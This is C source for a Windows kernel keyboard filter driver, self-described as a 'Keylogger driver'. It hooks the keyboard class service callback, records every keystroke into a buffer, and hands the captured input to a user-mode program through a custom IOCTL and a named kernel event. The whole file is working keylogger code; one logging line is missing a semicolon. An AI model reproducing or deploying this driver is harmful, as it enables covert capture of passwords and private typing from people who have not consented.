#include "klog.h"

#ifdef ALLOC_PRAGMA
    #pragma alloc_text (INIT, DriverEntry)
    #pragma alloc_text (PAGE, Klog_EvtDeviceAdd)
    #pragma alloc_text (PAGE, Klog_EvtIoInternalDeviceControl)
#endif

KEYBOARD_INPUT_BUFFER   keyboardInputBuffer = {0};      // {0} is not necessarily

NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject,
                     IN PUNICODE_STRING RegistryPath)
{
    DebugPrintInfo("Keylogger driver. Built %s %s\n", __DATE__, __TIME__);

    WDF_DRIVER_CONFIG   config;
    NTSTATUS            status;

    WDF_DRIVER_CONFIG_INIT(&config, Klog_EvtDeviceAdd);
    status = WdfDriverCreate(DriverObject, RegistryPath,
                             WDF_NO_OBJECT_ATTRIBUTES,
                             &config, WDF_NO_HANDLE);
    if (NT_SUCCESS(status)) {
        DebugPrintInfo("Driver created successfully\n");
    }
    else {
        DebugPrintError("WdfDriverCreate failed. Status code 0x%X\n", status);
    }

    return status;
}

NTSTATUS Klog_EvtDeviceAdd(IN WDFDRIVER Driver,
                           IN PWDFDEVICE_INIT DeviceInit)
{
    DebugPrintInfo("Entered Klog_EvtDeviceAdd\n");

    UNREFERENCED_PARAMETER(Driver);
    PAGED_CODE();

    WDF_OBJECT_ATTRIBUTES   deviceAttributes;
    WDFDEVICE               device;
    //WDFQUEUE                queue;
    PDEVICE_EXTENSION       deviceExtentsion;
    WDF_IO_QUEUE_CONFIG     ioQueueConfig;
    NTSTATUS                status;

    WdfFdoInitSetFilter(DeviceInit);
    WdfDeviceInitSetDeviceType(DeviceInit, FILE_DEVICE_KEYBOARD);
    WDF_OBJECT_ATTRIBUTES_INIT_CONTEXT_TYPE(&deviceAttributes, DEVICE_EXTENSION);

    status = WdfDeviceCreate(&DeviceInit, &deviceAttributes, &device);
    if (!NT_SUCCESS(status)) {
        DebugPrintError("WdfDeviceCreate failed. Status code 0x%X\n", status);
        return status;
    }

    deviceExtentsion = GetDeviceExtension(device);

    WDF_IO_QUEUE_CONFIG_INIT_DEFAULT_QUEUE(&ioQueueConfig,
                                           WdfIoQueueDispatchParallel);
    
    //
    // Framework by default creates non-power managed queues for
    // filter drivers.
    //
    
    ioQueueConfig.EvtIoInternalDeviceControl = Klog_EvtIoInternalDeviceControl;
    ioQueueConfig.EvtIoDeviceControl = Klog_EvtIoDeviceControl;
    
    status = WdfIoQueueCreate(device, &ioQueueConfig,
                              WDF_NO_OBJECT_ATTRIBUTES,
                              WDF_NO_HANDLE);
    if (!NT_SUCCESS(status)) {
        DebugPrintError("WdfIoQueueCreate failed. Status code 0x%X\n", status);
        return status;
    }

    UNICODE_STRING symlinkName;
    RtlInitUnicodeString(&symlinkName, DEV_SYMBOLIC_LINK);
    status = WdfDeviceCreateSymbolicLink(device, &symlinkName);
    if (!NT_SUCCESS(status)) {
        DebugPrintError("WdfDeviceCreateSymbolicLink failed. Status code 0x%X\n", status);
        return status;
    }

    return status;
}

VOID Klog_EvtIoInternalDeviceControl(IN WDFQUEUE Queue, IN WDFREQUEST Request,
                                     IN size_t OutputBufferLength, IN size_t InputBufferLength,
                                     IN ULONG IoControlCode)
{
    DebugPrintInfo("Entered Klog_EvtIoInternalDeviceControl. Processed IOCTL code 0x%X\n", IoControlCode);

    UNREFERENCED_PARAMETER(OutputBufferLength);
    UNREFERENCED_PARAMETER(InputBufferLength);
    PAGED_CODE();

    PDEVICE_EXTENSION               deviceExtension;
    PCONNECT_DATA                   connectData = NULL;
    NTSTATUS                        status = STATUS_SUCCESS;
    size_t                          length;
    WDFDEVICE                       device;
    BOOLEAN                         isRequestSent = TRUE;
    WDF_REQUEST_SEND_OPTIONS        options;

    device = WdfIoQueueGetDevice(Queue);
    deviceExtension = GetDeviceExtension(device);

    switch (IoControlCode) {
        case IOCTL_INTERNAL_KEYBOARD_CONNECT:
            // Allow only one connection
            if (deviceExtension->UpperConnectData.ClassService != NULL) {
                status = STATUS_SHARING_VIOLATION;
                DebugPrintError("Multiple connections are not allowed. Status code 0x%X\n", status);
                break;
            }

            status = WdfRequestRetrieveInputBuffer(Request,
                                                   sizeof(CONNECT_DATA),
                                                   &connectData,
                                                   &length);
            if (!NT_SUCCESS(status)) {
                DebugPrintError("WdfRequestRetrieveInputBuffer failed. Status code 0x%X\n", status);
                break;
            }

            NT_ASSERTMSG("Request input buffer length is not equal to "
                         "input buffer length in function parameters", 
                         length == InputBufferLength);

            deviceExtension->UpperConnectData = *connectData;
            connectData->ClassDeviceObject = WdfDeviceWdmGetDeviceObject(device);

            #pragma warning(disable:4152)
            connectData->ClassService = Klog_ServiceCallback;
            #pragma warning(default:4152)

            status = InitKeyboardInputBuffer();
            if (!NT_SUCCESS(status)) {
                DebugPrintError("InitKeyboardInputBuffer failed. Status code 0x%X\n", status);
                break;
            }

            break;

        case IOCTL_INTERNAL_KEYBOARD_DISCONNECT:
            deviceExtension->UpperConnectData.ClassDeviceObject = NULL;
            deviceExtension->UpperConnectData.ClassService = NULL;

            if (keyboardInputBuffer.SpinLock) {
                WdfSpinLockRelease(keyboardInputBuffer.SpinLock);
            }
            if (keyboardInputBuffer.DataAddedEvent) {
                status = ZwClose(keyboardInputBuffer.DataAddedEvent);
            }

            break;

        case IOCTL_KEYBOARD_QUERY_INDICATOR_TRANSLATION:
        case IOCTL_KEYBOARD_QUERY_INDICATORS:
        case IOCTL_KEYBOARD_SET_INDICATORS:
        case IOCTL_KEYBOARD_QUERY_TYPEMATIC:
        case IOCTL_KEYBOARD_SET_TYPEMATIC:
            break;

        default:
            break;
    }

    if (!NT_SUCCESS(status)) {
        DebugPrintError("Failed to process IOCTL. Status code 0x%X\n", status);
        WdfRequestComplete(Request, status);
        return;
    }

    //
    // We are not interested in post processing the IRP so 
    // fire and forget.
    //
    WDF_REQUEST_SEND_OPTIONS_INIT(&options,
                                  WDF_REQUEST_SEND_OPTION_SEND_AND_FORGET);
    isRequestSent = WdfRequestSend(Request, WdfDeviceGetIoTarget(device), &options);
    if (isRequestSent == FALSE) {
        status = WdfRequestGetStatus(Request);
        DebugPrintError("WdfRequestSend failed. Status code 0x%X\n", status);
        WdfRequestComplete(Request, status);
    }
}

VOID Klog_EvtIoDeviceControl(IN WDFQUEUE Queue, IN WDFREQUEST Request,
                             IN size_t OutputBufferLength, IN size_t InputBufferLength,
                             IN ULONG IoControlCode)
{
    DebugPrintInfo("Entered Klog_EvtIoDeviceControl\n");

    UNREFERENCED_PARAMETER(InputBufferLength);
    
    WDFDEVICE           device;
    WDFMEMORY           outputMemory;
    PDEVICE_EXTENSION   deviceExtension;
    size_t              bytesRead = 0;
    NTSTATUS            status = STATUS_SUCCESS;

    device = WdfIoQueueGetDevice(Queue);
    deviceExtension = GetDeviceExtension(device);

    switch (IoControlCode) {
        case IOCTL_KLOG_GET_INPUT_DATA:
            if (OutputBufferLength < sizeof(keyboardInputBuffer.InputData)) {
                status = STATUS_BUFFER_TOO_SMALL;
                DebugPrintError("Size of provided output buffer is too small. Status code 0x%X\n", status);
                break;
            }

            status = WdfRequestRetrieveOutputMemory(Request, &outputMemory);
            if (!NT_SUCCESS(status)) {
                DebugPrintError("WdfRequestRetrieveOutputMemory failed. Status code 0x%X\n", status);
                break;
            }

            status = ReadKeyboardInputDataFromBuffer(outputMemory, &bytesRead);
            if (!NT_SUCCESS(status)) {
                DebugPrintError("Failed to read memory from keyboard input buffer. Status code 0x%X\n",
                                status);
                break;
            }

            break;

        case IOCTL_KLOG_INIT:
            status = InitNotificationEvent();
            if (!NT_SUCCESS(status)) {
                DebugPrintError("Failed to initialize notification event. Status code 0x%X\n",
                                status);
                break;
            }

            break;

        default:
            status = STATUS_NOT_IMPLEMENTED;
            break;
    }

    WdfRequestCompleteWithInformation(Request, status, bytesRead);

    return;
}

NTSTATUS InitKeyboardInputBuffer()
{
    DebugPrintInfo("Entered InitKeyboardInputBuffer\n");

    NTSTATUS                status;
    WDF_OBJECT_ATTRIBUTES   spinLockAttributes;

    WDF_OBJECT_ATTRIBUTES_INIT(&spinLockAttributes);
    status = WdfSpinLockCreate(&spinLockAttributes, &keyboardInputBuffer.SpinLock);
    if (!NT_SUCCESS(status)) {
        DebugPrintError("WdfSpinLockCreate failed. Status code 0x%X\n", status);
        return status;
    }

    return status;
}

NTSTATUS InitNotificationEvent()
{
    UNICODE_STRING      eventName;
    OBJECT_ATTRIBUTES   eventAttributes;
    NTSTATUS            status;

    RtlInitUnicodeString(&eventName, L"\\BaseNamedObjects\\KeyboardInputDataAddedEvent");
    InitializeObjectAttributes(&eventAttributes, &eventName, OBJ_KERNEL_HANDLE | OBJ_PERMANENT, NULL, NULL);

    status = ZwOpenEvent(&keyboardInputBuffer.DataAddedEvent, EVENT_ALL_ACCESS, &eventAttributes);
    if (status == STATUS_OBJECT_NAME_NOT_FOUND) {
        status = ZwCreateEvent(&keyboardInputBuffer.DataAddedEvent, EVENT_ALL_ACCESS,
                               &eventAttributes, NotificationEvent, FALSE);
        if (!NT_SUCCESS(status)) {
            DebugPrintError("ZwCreateEvent failed. Status code 0x%X\n", status);
            return status;
        }
    }
    else if (!NT_SUCCESS(status)) {
        DebugPrintError("ZwOpenEvent failed. Status code 0x%X\n", status);
        return status;
    }

    return status;
}

VOID Klog_ServiceCallback(IN PDEVICE_OBJECT DeviceObject, IN PKEYBOARD_INPUT_DATA InputDataStart,
                          IN PKEYBOARD_INPUT_DATA InputDataEnd, IN OUT PULONG InputDataConsumed)
{
    DebugPrintInfo("Entered Klog_ServiceCallback\n");

    PDEVICE_EXTENSION       deviceExtension;
    WDFDEVICE			    device;
    size_t                  totalKeys;
    PKEYBOARD_INPUT_DATA    inputKey;

    device = WdfWdmDeviceGetWdfDeviceHandle(DeviceObject);
    deviceExtension = GetDeviceExtension(device);
    totalKeys = (size_t) (InputDataEnd - InputDataStart);
    inputKey = InputDataStart;

    for (ULONG i = 0; i < totalKeys; ++i) {
        AddKeyboardInputDataToBuffer(&inputKey[i]);
    }
    if (totalKeys > 0) {
        NotifyUserModeApp();
    }

    (*(PSERVICE_CALLBACK_ROUTINE) (ULONG_PTR) deviceExtension->UpperConnectData.ClassService)(
        deviceExtension->UpperConnectData.ClassDeviceObject,
        InputDataStart, InputDataEnd, InputDataConsumed);
}

VOID AddKeyboardInputDataToBuffer(PKEYBOARD_INPUT_DATA Entry)
{
    WdfSpinLockAcquire(keyboardInputBuffer.SpinLock);

    if (keyboardInputBuffer.Tail < KEYBOARD_INP_BUFFER_SIZE) {
        keyboardInputBuffer.InputData[keyboardInputBuffer.Tail] = *Entry;
        keyboardInputBuffer.Tail = keyboardInputBuffer.Tail + 1;
    }

    WdfSpinLockRelease(keyboardInputBuffer.SpinLock);
}

VOID NotifyUserModeApp()
{
    if (keyboardInputBuffer.DataAddedEvent) {
        KeSetEvent(keyboardInputBuffer.DataAddedEvent, IO_NO_INCREMENT, FALSE);
    }
}

NTSTATUS ReadKeyboardInputDataFromBuffer(OUT WDFMEMORY Destination, OUT size_t* BytesRead)
{
    NTSTATUS    status = STATUS_SUCCESS;
    size_t      sizeOfOneInputDataEntry = sizeof(keyboardInputBuffer.InputData[0]);
    *BytesRead = 0;

    WdfSpinLockAcquire(keyboardInputBuffer.SpinLock);
    
    size_t bytesToRead = keyboardInputBuffer.Tail * sizeOfOneInputDataEntry;
    if (bytesToRead <= 0) {
        goto Exit;
    }

    status = WdfMemoryCopyFromBuffer(Destination, 0, 
                                     keyboardInputBuffer.InputData, bytesToRead);
    if (NT_SUCCESS(status)) {
        keyboardInputBuffer.Tail = 0;
        *BytesRead = bytesToRead;
    }
    else {
        DebugPrintError("WdfMemoryCopyFromBuffer failed. Status code 0x%X\n", status)
    }

Exit:
    WdfSpinLockRelease(keyboardInputBuffer.SpinLock);
    return status;
}
